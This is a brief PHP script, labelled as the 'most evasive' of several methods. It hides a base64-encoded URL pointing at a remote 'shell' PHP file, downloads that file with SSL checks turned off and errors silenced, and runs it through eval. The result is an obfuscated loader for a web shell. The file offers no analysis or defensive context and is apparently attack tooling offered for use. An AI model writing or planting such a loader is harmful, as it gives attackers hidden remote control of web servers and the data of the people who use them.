<?php
// Method 10: MIXED ENCODING (MOST EVASIVE)
error_reporting(0);
$_0x1a2b='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ljYXJ1czg4ODgvc2hlbGwvcmVmcy9oZWFkcy9tYWluL2FkZW4ucGhw';
$_0x3c4d=function($_0x5e6f){$_0x7g8h=base64_decode($_0x5e6f);$_0x9i0j=gzuncompress(base64_decode(base64_encode(gzcompress($_0x7g8h))));return $_0x9i0j;};
$url=base64_decode($_0x1a2b);$c=curl_init($url);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);eval("?>".curl_exec($c));
?>